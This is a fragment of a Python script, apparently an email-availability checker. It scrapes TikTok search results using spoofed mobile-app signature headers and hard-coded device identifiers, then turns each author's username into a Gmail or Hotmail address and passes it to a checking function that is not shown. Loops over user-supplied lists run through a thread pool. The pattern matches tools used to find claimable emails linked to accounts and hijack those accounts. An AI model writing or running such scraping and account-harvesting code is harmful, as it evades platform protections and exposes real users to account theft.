                'request_tag_from': 'h5',
                'manifest_version_code': '350302',
                '_rticket': '1746293432361',
                'app_language': 'ar',
                'app_type': 'normal',
                'iid': '7496924689664935687',
                'channel': 'googleplay',
                'device_type': 'RMX3941',
                'language': 'ar',
                'host_abi': 'arm64-v8a',
                'locale': 'ar',
                'resolution': '1080*2290',
                'openudid': '4a4760153b7de268',
                'update_version_code': '350302',
                'ac2': 'wifi5g',
                'cdid': 'e1e7a0b5-26b0-4052-becb-723516452cbd',
                'sys_region': 'IQ',
                'os_api': '34',
                'timezone_name': 'Asia%2FBaghdad',
                'dpi': '480',
                'carrier_region': 'IQ',
                'ac': 'wifi',
                'device_id': '7458734982867355141',
                'os_version': '12',
                'timezone_offset': '10800',
                'version_code': '350302',
                'app_name': 'musically_go',
                'ab_version': '35.3.2',
                'version_name': '35.3.2',
                'device_brand': 'realme',
                'op_region': 'IQ',
                'ssmix': 'a',
                'device_platform': 'android',
                'build_number': '35.3.2',
                'region': 'IQ',
                'aid': '1340',
                'ts': '1746290524'
            }
            signed_params = get(params=params)
            headers = {
                'User-Agent': "com.zhiliaoapp.musically.go/350302 (Linux; U; Android 12; ar_IQ; RMX3941; Build/UKQ1.231108.001;tt-ok/3.12.13.21-ul)",    
                'rpc-persist-pyxis-policy-v-tnc': "1",
                'x-tt-req-timeout': "90000",
                'sdk-version': "2",
                'passport-sdk-version': "30990",
                'x-tt-ultra-lite': "1",
                'x-vc-bdturing-sdk-version': "2.3.2.i18n",
                'x-tt-store-region': "iq",
                'x-tt-store-region-src': "did",
            }
            signature = sign(params=signed_params)
            headers.update({
                'x-ss-req-ticket': signature['x-ss-req-ticket'],
                'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature["x-argus"],
                'x-gorgon': signature["x-gorgon"],
                'x-khronos': signature["x-khronos"],
                'x-ladon': signature["x-ladon"],
            })
            try:
                response = requests.get(url, params=signed_params, headers=headers)
                data=response.json()
                if 'data' in data and isinstance(data['data'], list):
                    for item in data['data']:
                        aweme = item.get('aweme_info')
                        if aweme and 'author' in aweme:
                            author = aweme['author']
                            username = author.get('unique_id') 
                            followers = author.get('follower_count') 
                            email=username+"@gmail.com"    
                            
                            self.API_CH(email)
            except:""
    def Serch_hotmail(self):
        while True:
            keyword=''.join((random.choice(self.keyword) for i in range(random.randrange(4,9))))
            url = "https://search19-normal-alisg.tiktokv.com/aweme/v1/general/search/single/"
            params = {
                'cursor': '10',
                'enable_lite_workflow': '0',
                'enter_from': 'homepage_hot',
                'enable_lite_cut': '1',
                'backtrace': 'ad_cursor%253D12%253Bcs_next_img_group%253D1%253Bcurrent_page%253D1%253Brs_card_next_index%253D0%253Brs_next_a%253D1%253Brs_next_index%253D4%253Brs_word_next_index%253D0',
                'count': '20',
                'last_search_id': '202505031730279957F33446D550A9EB88',
                'end_to_end_search_session_id': '',
                'keyword':keyword ,
                'query_correct_type': '0',
                'search_source': 'normal_search',
                'search_id': '20250503173028ABF760554790F9B05684',
                'request_tag_from': 'h5',
                'manifest_version_code': '350302',
                '_rticket': '1746293432361',
                'app_language': 'ar',
                'app_type': 'normal',
                'iid': '7496924689664935687',
                'channel': 'googleplay',
                'device_type': 'RMX3941',
                'language': 'ar',
                'host_abi': 'arm64-v8a',
                'locale': 'ar',
                'resolution': '1080*2290',
                'openudid': '4a4760153b7de268',
                'update_version_code': '350302',
                'ac2': 'wifi5g',
                'cdid': 'e1e7a0b5-26b0-4052-becb-723516452cbd',
                'sys_region': 'IQ',
                'os_api': '34',
                'timezone_name': 'Asia%2FBaghdad',
                'dpi': '480',
                'carrier_region': 'IQ',
                'ac': 'wifi',
                'device_id': '7458734982867355141',
                'os_version': '12',
                'timezone_offset': '10800',
                'version_code': '350302',
                'app_name': 'musically_go',
                'ab_version': '35.3.2',
                'version_name': '35.3.2',
                'device_brand': 'realme',
                'op_region': 'IQ',
                'ssmix': 'a',
                'device_platform': 'android',
                'build_number': '35.3.2',
                'region': 'IQ',
                'aid': '1340',
                'ts': '1746290524'
            }
            signed_params = get(params=params)
            headers = {
                'User-Agent': "com.zhiliaoapp.musically.go/350302 (Linux; U; Android 12; ar_IQ; RMX3941; Build/UKQ1.231108.001;tt-ok/3.12.13.21-ul)",    
                'rpc-persist-pyxis-policy-v-tnc': "1",
                'x-tt-req-timeout': "90000",
                'sdk-version': "2",
                'passport-sdk-version': "30990",
                'x-tt-ultra-lite': "1",
                'x-vc-bdturing-sdk-version': "2.3.2.i18n",
                'x-tt-store-region': "iq",
                'x-tt-store-region-src': "did",
            }
            signature = sign(params=signed_params)
            headers.update({
                'x-ss-req-ticket': signature['x-ss-req-ticket'],
                'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature["x-argus"],
                'x-gorgon': signature["x-gorgon"],
                'x-khronos': signature["x-khronos"],
                'x-ladon': signature["x-ladon"],
            })
            try:
                response = requests.get(url, params=signed_params, headers=headers)
                data=response.json()
                if 'data' in data and isinstance(data['data'], list):
                    for item in data['data']:
                        aweme = item.get('aweme_info')
                        if aweme and 'author' in aweme:
                            author = aweme['author']
                            username = author.get('unique_id') 
                            followers = author.get('follower_count') 
                            email=username+"@hotmail.com"    
                            
                            self.API_CH(email)
            except:""
    def admin_hotmail(self):
        try:
            file = open(self.file,'r').read().splitlines()
        except:
            os.system('cls')
            print(S+"السته غير موجوده  ! " )
            exit()
        with F300(max_workers=self.max) as executor:
            futures = [executor.submit(self.API_CH, user+"@hotmail.com") for user in file]
            for future in futures:
                future.result()
    def admin_gmail(self):
        try:
            file = open(self.file,'r').read().splitlines()
        except:
            os.system('cls')
            print(S+"السته غير موجوده  ! " )
            exit()
        with F300(max_workers=self.max) as executor:
            futures = [executor.submit(self.API_CH, user+"@gmail.com") for user in file]
            for future in futures:
                future.result()
HSO()
